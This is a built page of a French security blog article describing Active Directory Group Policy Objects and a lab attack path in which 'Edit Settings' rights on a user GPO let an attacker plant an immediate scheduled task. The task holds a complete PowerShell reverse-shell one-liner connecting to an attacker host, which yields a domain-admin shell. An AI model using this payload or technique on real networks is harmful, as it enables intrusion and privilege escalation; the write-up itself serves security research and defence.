@@ -1,0 +1,453 @@
+<!doctype html>
+<html lang="fr-fr" class="no-js">
+
+  <head>
+    <link href="http://gmpg.org/xfn/11" rel="profile" hreflang="fr">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  
+    <meta name="google-site-verification" content="JeRPv2CEcpONAy8C7dMr1nzjlpZxlxYCtt2PnuQ78g8" />
+    <!-- Enable responsiveness on mobile devices-->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  
+    <title>
+      
+        GPO - Chemin d'attaque - hackndo
+      
+    </title>
+
+	<link rel="stylesheet" href="/assets/css/style.css?v=1.13"> <!-- Resource style -->
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Signika:600"> <!-- Logo font -->
+    <script src="/assets/js/modernizr.js"></script> <!-- Modernizr -->
+    
+    <link rel="apple-touch-icon" sizes="57x57" href="/assets/icones/favicon/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="/assets/icones/favicon/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="/assets/icones/favicon/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="/assets/icones/favicon/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="/assets/icones/favicon/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="/assets/icones/favicon/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="/assets/icones/favicon/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="/assets/icones/favicon/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/icones/favicon/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icones/favicon/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/icones/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="/assets/icones/favicon/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/icones/favicon/favicon-16x16.png">
+    <link rel="manifest" href="/assets/res/manifest.json">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/assets/icones/favicon/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+  	
+	<!-- RSS -->
+    <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="hackndo" />
+
+    <!-- Twitter card -->
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="@hackanddo" />
+    <meta name="twitter:creator" content="@hackanddo" />
+    <meta name="twitter:title" content="GPO - Chemin d'attaque" />
+    <meta name="twitter:description" content="Cet article présente ce qu'est une GPO puis décrit un chemin d'attaque possible lorsqu'un attaquant a le droit de modifier les paramètres d'une GPO qui s'applique à des utilisateurs." />
+    
+    <meta name="twitter:image" content="http://localhost:4000/assets/uploads/2019/04/gpo_banner.png" />
+    
+  
+    <!-- Google analytics -->
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  
+      ga('create', 'UA-80312745-1', 'auto');
+      ga('send', 'pageview');
+  
+    </script>
+    <!-- Begin Jekyll SEO tag v2.6.1 -->
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="GPO - Chemin d’attaque" />
+<meta name="author" content="Pixis" />
+<meta property="og:locale" content="fr_FR" />
+<meta name="description" content="Cet article présente ce qu’est une GPO puis décrit un chemin d’attaque possible lorsqu’un attaquant a le droit de modifier les paramètres d’une GPO qui s’applique à des utilisateurs." />
+<meta property="og:description" content="Cet article présente ce qu’est une GPO puis décrit un chemin d’attaque possible lorsqu’un attaquant a le droit de modifier les paramètres d’une GPO qui s’applique à des utilisateurs." />
+<link rel="canonical" href="http://localhost:4000/gpo-abuse-with-edit-settings/" />
+<meta property="og:url" content="http://localhost:4000/gpo-abuse-with-edit-settings/" />
+<meta property="og:site_name" content="hackndo" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-04-23T13:28:42+02:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/icones/logo.png"},"name":"Pixis"},"url":"http://localhost:4000/gpo-abuse-with-edit-settings/","headline":"GPO - Chemin d’attaque","dateModified":"2019-04-23T13:28:42+02:00","datePublished":"2019-04-23T13:28:42+02:00","author":{"@type":"Person","name":"Pixis"},"description":"Cet article présente ce qu’est une GPO puis décrit un chemin d’attaque possible lorsqu’un attaquant a le droit de modifier les paramètres d’une GPO qui s’applique à des utilisateurs.","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/gpo-abuse-with-edit-settings/"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+  <body>
+    <header class="cd-main-header">
+    <a href="/" class="cd-logo"><img src="/assets/icones/logo.png" /> <span class="cd-logo-title">hackndo</span></a>
+		
+    <a href="#0" class="cd-nav-trigger">Menu<span></span></a>
+
+</header> <!-- .cd-main-header -->
+    <main class="cd-main-content">
+		<nav class="cd-side-nav">
+            <div class="sidebar-about">
+    <h1>
+        <img id="site-logo" src="/assets/icones/logo.png" alt="logo" title="logo" />
+        <a class="sidebar-title" href="/">
+        hackndo
+        </a>
+    </h1>
+    <p class="lead">Think out of the box</p>
+</div>
+
+<ul>
+    <li class="cd-label">Blog</li>
+    <li class="">
+        <a href="/">Home</a>
+    </li>
+    
+    
+        
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/about/">À propos</a>
+                </li>
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/archives/">Archives</a>
+                </li>
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/contact/">Me contacter</a>
+                </li>
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/disclaimer/">Disclaimer</a>
+                </li>
+            
+        
+    
+        
+    
+        
+            
+        
+    
+        
+            
+                <li class="">
+                    <a href="/projects/">Projets</a>
+                </li>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+    
+        
+    
+</ul>
+<ul>
+    <li class="cd-label">Liens</li>
+    <li><a href="https://www.dailysecurity.fr/" target="_blank">Blog de Geluchat</a></li>
+    <li><a href="http://lsdsecdaemon.com" target="_blank">Blog de Th3_l5D</a></li>
+    <li><a href="http://inf0sec.fr" target="_blank">Blog de Matthieu</a></li>
+</ul>
+<p class="sidebar-copyright">&copy; 2019. Tous droits réservés.</p>
+<div class="sidebar-social">
+<ul>
+  <li><a href="https://twitter.com/HackAndDo" title="Twitter" target="_blank"><img alt="Twitter" title="Twitter" src="/assets/icones/social/twitter.png" /></a></li>
+  <li><a href="https://github.com/hackndo" title="Github" target="_blank"><img title="Github" alt="Github" src="/assets/icones/social/github.png" /></a></li>
+  <li><a href="https://www.youtube.com/channel/UC9WYWHLdu9TK-0Hu3wcHJ9g" title="Youtube" target="_blank"><img title="Youtube" alt="Youtube" src="/assets/icones/social/youtube.png" /></a></li>
+  <li><a href="https://discord.gg/9At6SUZ" title="Discord" target="_blank"><img title="Discord" alt="Discord" src="/assets/icones/social/discord.png" /></a></li>
+  <li><a href="https://www.linkedin.com/in/romainbentz/" title="LinkedIn" target="_blank"><img title="LinkedIn" alt="LinkedIn" src="/assets/icones/social/linkedin.png" /></a></li>
+  <li><a href="https://sh.hackndo.com" title="Shell" target="_blank"><img title="Shell" alt="Shell" src="/assets/icones/social/shell.png" /></a></li>
+  <li><a href="/feed.xml" title="RSS" target="_blank"><img title="RSS" alt="RSS" src="/assets/icones/social/rss.png" /></a></li>
+  <li><a href="https://ko-fi.com/hackndo" title="Ko-Fi" target="_blank"><img title="Ko-Fi" alt="Ko-Fi" src="/assets/icones/social/kofi.gif" /></a></li>
+</ul>
+</div>
+        </nav>
+
+        <div class="content-wrapper">
+            <div class="post">
+  
+  <div class="post-cover">
+    <img src="/assets/uploads/2019/04/gpo_banner.png" alt="GPO - Chemin d'attaque" title="GPO - Chemin d'attaque" />
+  </div>
+  
+  <h1 class="post-title">GPO - Chemin d'attaque</h1>
+  <div class="post-info">
+      <p class="alignleft">23 Apr 2019 <a class="post-comments-count" href="http://http://localhost:4000/gpo-abuse-with-edit-settings/#disqus_thread"></a></p>
+      <p class="alignright">Auteur : <strong><a href="https://twitter.com/HackAndDo">Pixis</a></strong></p>
+      <div class="keywords">
+        <span class="post-tags"><a href="/archives/#active-directory"><i class="fas fa-tags"></i> Active Directory</a><a href="/archives/#windows"><i class="fas fa-tags"></i> Windows</a></span>
+      </div>
+</div>
+
+  <article>
+  <p>Cet article présente ce qu’est une GPO (Group Policy Object) puis décrit un chemin d’attaque possible lorsqu’un attaquant a le droit de modifier les paramètres d’une GPO qui s’applique à des utilisateurs.</p>
+
+<!--more-->
+
+<h2 id="group-policy-object">Group Policy Object</h2>
+
+<h3 id="définition">Définition</h3>
+
+<p>Parmi les différents rôles d’un Active Directory se trouve le rôle de gestion du parc. Active Directory permet de gérer l’ensemble des machines et utilisateurs du système d’information, et pour cela les “stratégies de groupe” (Group Policy Objects - GPO) sont un outil indispensable.</p>
+
+<p>Concrètement, les GPO sont un ensemble de règles/actions qui s’appliquent à un ensemble bien défini d’objets. Une GPO permet de faire beaucoup, beaucoup de choses.</p>
+
+<p><a href="/assets/uploads/2019/04/example_gpo.png"><img src="/assets/uploads/2019/04/example_gpo.png" alt="Example GPO" /></a></p>
+
+<p>Comme on le voit sur cette capture d’écran, il est possible de créer/modifier des scripts au démarrage et à l’arrêt d’une machine, de changer les paramètres du pare-feu, de créer des tâches planifiées, ou même d’ajouter des utilisateurs au groupe local d’administration. Ce ne sont que des exemples parmi tant d’autres pour montrer à quel point les fonctionnalités imposables via GPO sont diverses et puissantes.</p>
+
+<h3 id="composition">Composition</h3>
+
+<p>Une GPO est composée de deux éléments :</p>
+
+<ul>
+  <li>Un conteneur (Group Policy Container - GPC), qui est l’objet enregistré dans l’Active Directory, sous le groupe <code class="highlighter-rouge">adsec.local &gt; system &gt; policies</code>. Chaque GPO est identifiée par un identifiant unique dans le domaine.</li>
+</ul>
+
+<p><a href="/assets/uploads/2019/04/gpc.png"><img src="/assets/uploads/2019/04/gpc.png" alt="GPC" /></a></p>
+
+<p>C’est ici que sont gérés finement les droits de création/modification des GPO, comme tout objet de l’Active Directory.</p>
+
+<ul>
+  <li>Les fichiers qui contiennent les informations à appliquer sur les machines ou les utilisateurs. Ces fichiers sont présents sur chaque contrôleur de domaine, dans le partage réseau <code class="highlighter-rouge">\\dc-01.adsec.local\SYSVOL\adsec.local\Policies\</code>, et sont organisés dans des dossiers : Un dossier par GPO, le nom du dossier étant l’identifiant unique correspondant au conteneur GPC.</li>
+</ul>
+
+<p><a href="/assets/uploads/2019/04/gpo_files.png"><img src="/assets/uploads/2019/04/gpo_files.png" alt="GPO files" /></a></p>
+
+<p>C’est grâce à l’exposition de ces fichiers aux comptes de domaine que ces derniers peuvent mettre à jour leurs GPO.</p>
+
+<h2 id="contexte-de-recherche">Contexte de recherche</h2>
+
+<p>Dans ma croisade en plein Active Directory, j’utilise de manière très intense l’outil <a href="https://github.com/BloodHoundAD/BloodHound">Bloodhound</a> développé par <a href="https://twitter.com/_wald0">@wald0</a>, <a href="https://twitter.com/harmj0y">@Harmj0y</a> et <a href="https://twitter.com/cptjesus">@CptJesus</a>, que je ne remercierai jamais assez pour leur travail et leur disponibilité sur leur slack <a href="https://bloodhoundgang.herokuapp.com/">BloodHoundHQ</a>.</p>
+
+<p>Après avoir regardé la <a href="https://www.youtube.com/watch?v=0r8FzbOg2YU&amp;list=PL1eoQr97VfJnvOWo_Jxk2qUrFyB-BJh4Y&amp;index=4&amp;t=0s">prise de parole</a> de <a href="https://twitter.com/_wald0">@wald0</a> et <a href="https://twitter.com/cptjesus">@CptJesus</a> à la conférence <a href="https://www.troopers.de/">WeAreTroopers</a>, j’ai commencé à me pencher sur les chemins d’attaque impliquant les GPO. Bloodhound aide énormément sur ce sujet, et propose notamment un chemin d’attaque lorsqu’un compte du domaine a les droits <code class="highlighter-rouge">WriteDacl</code> sur une GPO.</p>
+
+<p><a href="/assets/uploads/2019/04/bh_path.png"><img src="/assets/uploads/2019/04/bh_path.png" alt="BloodHound Path" /></a></p>
+
+<p>Sur ce schéma, on voit un utilisateur avec un crâne, correspondant à un compte compromis. Ce compte fait partie d’un groupe qui possède les droits <code class="highlighter-rouge">WriteDacl</code> sur une GPO. Cette GPO s’applique enfin à une unité d’organisation (OU) contenant notamment l’utilisateur en bas à droite, cible de l’attaque.</p>
+
+<p>Ce droit <code class="highlighter-rouge">WriteDacl</code> permet aux membres du groupe de modifier les ACL (Access Control List) de la GPO concernée, c’est à dire les droits d’accès à la GPO, notamment la modification du propriétaire de l’objet. Ainsi, un utilisateur du groupe possédant ce droit peut s’auto-proclamer propriétaire, pour ensuite la modifier arbitrairement.</p>
+
+<p>Par défaut, lorsqu’une GPO est créée, peu de personnes ont le droit de la modifier. Les utilisateurs peuvent la lire (obligatoire pour pouvoir l’appliquer !), mais seuls les groupes “Domain Admins” et “Enterprise Admins” ont les droits absolus dessus, c’est à dire qu’ils peuvent la modifier (Edit Settings), la supprimer (Delete), et modifier les droits d’accès (Modify Security).</p>
+
+<p><a href="/assets/uploads/2019/04/ACL_GPO.png"><img src="/assets/uploads/2019/04/ACL_GPO.png" alt="ACL GPO" /></a></p>
+
+<p>Si un administrateur souhaite déléguer ces permissions à un utilisateur sans pour autant l’ajouter à l’un des deux groupes, c’est tout à fait possible via cet onglet de délégation. C’est un endroit simplifiant la gestion des droits sur une GPO. En effet, il est tout à fait possible de modifier les droits directement au niveau de la GPC, mais c’est beaucoup plus complexe.</p>
+
+<p><a href="/assets/uploads/2019/04/GPC_rights.png"><img src="/assets/uploads/2019/04/GPC_rights.png" alt="GPC Rights" /></a></p>
+
+<p>On voit que la barre de défilement permet de lister un grand, très grand nombre de paramètres d’accès.</p>
+
+<p>Il est donc plus aisé de passer par l’interface de gestion des GPO pour ajouter un utilisateur afin de lui déléguer des droits :</p>
+
+<p><a href="/assets/uploads/2019/04/add_user_acl_gpo.png"><img src="/assets/uploads/2019/04/add_user_acl_gpo.png" alt="Add User ACL Gpo" /></a></p>
+
+<p>Puis on indique les droits qu’on lui concède :</p>
+
+<p><a href="/assets/uploads/2019/04/edit_settings_add_user.png"><img src="/assets/uploads/2019/04/edit_settings_add_user.png" alt="Edit settings user" /></a></p>
+
+<p>Trois choix sont proposés, choix qui sont une préselection facilitant la vie des administrateurs, en modifiant des droits bien précis au niveau de la GPC.</p>
+
+<p><a href="/assets/uploads/2019/04/settings_added.png"><img src="/assets/uploads/2019/04/settings_added.png" alt="Edit settings added for user" /></a></p>
+
+<p>Maintenant cet utilisateur fait partie des personnes/groupes à avoir les droits ultimes sur cette GPO. C’est ce contrôle total que l’on voit apparaitre dans BloodHound lorsqu’une entité a un lien “WriteDacl” vers une GPO. En effet, cette présélection ajoute les paramètres de sécurité “Modify Owner” et “Modify Permissions”.</p>
+
+<p><a href="/assets/uploads/2019/04/writedacl.png"><img src="/assets/uploads/2019/04/writedacl.png" alt="Write DACL" /></a></p>
+
+<h2 id="droit-edit-settings">Droit “Edit Settings”</h2>
+
+<p>On a vu au-dessus qu’il y avait trois niveaux de délégation :</p>
+
+<ul>
+  <li>Read</li>
+  <li>Edit Settings</li>
+  <li>Edit Settings, delete, modify security</li>
+</ul>
+
+<p>Il n’y a que le troisième niveau qui est pris en charge dans la collecte BloodHound. Cependant, que se passe-t-il si un utilisateur ne possède que le droit de modifier la GPO, mais pas les ACL associées ? BloodHound ne remontant pas ce lien, c’est la question que je me suis posée.</p>
+
+<p>Pour y répondre, j’ai créé une GPO d’exemple, appelée “TestGPO Abuse”, s’appliquant à l’ensemble des utilisateurs appartenant à l’OU “Domain Users”. Comme dans l’exemple précédant, j’ai ajouté l’utilisateur “jdoe” dans la délégation de la gestion de cette GPO, en indiquant qu’il ne pouvait que modifier les paramètres de cette GPO, mais pas les ACL associées (“Edit Settings”).</p>
+
+<p><a href="/assets/uploads/2019/04/edit_settings_jdoe.png"><img src="/assets/uploads/2019/04/edit_settings_jdoe.png" alt="Edit Settings for jdoe" /></a></p>
+
+<h2 id="gpo-appliquée-à-des-utilisateurs">GPO appliquée à des utilisateurs</h2>
+
+<p>Dans ma recherche, je souhaitais également savoir ce que je pouvais faire lorsque la GPO ne s’appliquait qu’à des utilisateurs, pas à des machines. C’est pourquoi “TestGPO Abuse” ne s’applique qu’à l’OU “Domain Users”. En effet, tous les paramètres contrôlables dans la partie “Computer Configuration” de la GPO ne s’appliqueront pas si cette GPO est destinée à des utilisateurs. Seuls ceux dans “User Configuration” le seront.</p>
+
+<p><a href="/assets/uploads/2019/04/no_computer_gpo.png"><img src="/assets/uploads/2019/04/no_computer_gpo.png" alt="No Computer GPO" /></a></p>
+
+<p>Mais concrètement, qu’est-ce qui est disponible dans les paramètres de GPO appliqués à un utilisateur ? Et bien beaucoup moins de choses, mais des paramètres intéressants tout de même !</p>
+
+<p><a href="/assets/uploads/2019/04/user_gpo_example.png"><img src="/assets/uploads/2019/04/user_gpo_example.png" alt="User Example GPO" /></a></p>
+
+<p>On voit qu’on peut installer des paquets, gérer encore une fois les scripts au login/logout, éditer des groupes et utilisateurs locaux et les tâches planifiées.</p>
+
+<h2 id="exploitation-via-une-tâche-planifiée-immédiate">Exploitation via une tâche planifiée immédiate</h2>
+
+<p>Nous allons nous intéresser plus particulièrement aux tâches planifiées. Il est possible de créer des tâches planifiées qui s’exécuteront immédiatement, lorsque la GPO sera appliquée à l’utilisateur.</p>
+
+<p>Ainsi, si nous nous connectons en tant que l’utilisateur <code class="highlighter-rouge">jdoe</code> sur une machine, nous pouvons créer cette tâche.</p>
+
+<p><a href="/assets/uploads/2019/04/abusetask.png"><img src="/assets/uploads/2019/04/abusetask.png" alt="Abuse Task" /></a></p>
+
+<p>Elle est créée en tant que l’utilisateur <code class="highlighter-rouge">jdoe</code>, et lorsqu’elle sera appliquée, ce sera en tant que l’utilisateur à qui elle s’applique.</p>
+
+<p>Dans l’onglet “Actions”, nous indiquons ce qu’il se passera à l’exécution. Ici, nous utilisons un reverse-shell en Powershell pour que lors de son exécution, l’utilisateur cible se connecte à l’attaquant en proposant un shell.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TCPClient</span><span class="p">(</span><span class="s2">"10.0.20.12"</span><span class="p">,</span><span class="mi">443</span><span class="p">);</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">();[</span><span class="kt">byte</span><span class="p">[]]</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">65535</span><span class="o">|%</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="kr">while</span><span class="p">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$bytes</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="mi">0</span><span class="p">){;</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nf">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">System.Text.ASCIIEncoding</span><span class="p">)</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nf">iex</span><span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="o">&amp;</span><span class="nx">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">Out-String</span><span class="w"> </span><span class="p">);</span><span class="nv">$sendback2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$sendback</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"PS "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="nf">pwd</span><span class="p">)</span><span class="o">.</span><span class="nf">Path</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"&gt; "</span><span class="p">;</span><span class="nv">$sendbyte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="no">text.</span><span class="kt">encoding</span><span class="p">]::</span><span class="nf">ASCII</span><span class="p">)</span><span class="o">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Ce code est transormé en base 64 pour le passer à la commande <code class="highlighter-rouge">powershell -enc &lt;base 64 de la commande&gt;</code>.</p>
+
+<p><a href="/assets/uploads/2019/04/abusetask_pwsh.png"><img src="/assets/uploads/2019/04/abusetask_pwsh.png" alt="Abuse Task Powershell" /></a></p>
+
+<p>Une fois cette tâche créée, lors de la mise à jour des GPO sur un client, par exemple sur le compte <code class="highlighter-rouge">support-account</code> qui est administrateur du domaine dans ce lab, elle est exécutée sur la machine, et l’attaquant récupère un shell en tant qu’administrateur du domaine.</p>
+
+<p><a href="/assets/uploads/2019/04/re_shell_worked.png"><img src="/assets/uploads/2019/04/re_shell_worked.png" alt="Reverse Shell Worked" /></a></p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>L’idée de cet article est de montrer que les GPO sont un pilier dans l’organisation d’un Active Directory, et doivent être maitrisées tout autant que beaucoup d’autres objets. Une permission mal placée peut permettre à un attaquant d’en abuser et d’élever ses privilèges dans le système d’information.</p>
+
+<p>Ici, l’exemple de la tâche planifiée a été utilisé sur une GPO appliquée à des utilisateurs, cependant il existe un grand nombre de possibilités ouvertes par les GPO qui peuvent être utilisées pour exécuter du code.</p>
+
+  </article>
+</div>
+<div class="keywords">
+    <span class="post-tags"><a href="/archives/#active-directory"><i class="fas fa-tags"></i> Active Directory</a><a href="/archives/#windows"><i class="fas fa-tags"></i> Windows</a></span>
+  </div>
+
+
+<br />
+<div class="box">
+  <div class="dash">
+    <div class="picture">
+      <img src="/assets/icones/pixis_logo.png" alt="logo" title="logo" />
+    </div>
+    <div class="box_content">
+      <strong>Auteur</strong> : <a href="/contact/" target="_blank">Pixis</a><br />
+      Créateur du blog, suivez-moi sur <a href="https://twitter.com/HackAndDo/" target="_blank">twitter</a> ou <a href="https://discord.gg/9At6SUZ" target="blank">discord</a>
+    </div>
+    
+  </div>
+</div>
+
+
+<div class="related">
+  <h2>Articles similaires</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/pass-the-hash/">
+            Pass the Hash
+            <small>18 Dec 2019</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/remote-lsass-dump-passwords/">
+            Extraction des secrets de lsass à distance
+            <small>28 Nov 2019</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/bloodhound/">
+            BloodHound
+            <small>30 Jul 2019</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+<div id="disqus_thread"></div>
+<script>
+    /**
+     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+    
+    var disqus_config = function () {
+        this.page.url = 'http://localhost:4000/gpo-abuse-with-edit-settings/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = '0000-0000-0000-00ae';
+    };
+    
+    (function() {  // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        
+        s.src = '//hackndo.disqus.com/embed.js';
+        
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+        </div>
+    </main>
+    <script src="/assets/js/jquery-2.1.4.js"></script>
+    <script src="/assets/js/jquery.menu-aim.js"></script>
+    <script src="/assets/js/anchor.min.js"></script>
+    <script src="/assets/js/main.js"></script> <!-- Resource jQuery -->
+  </body>
+</html>
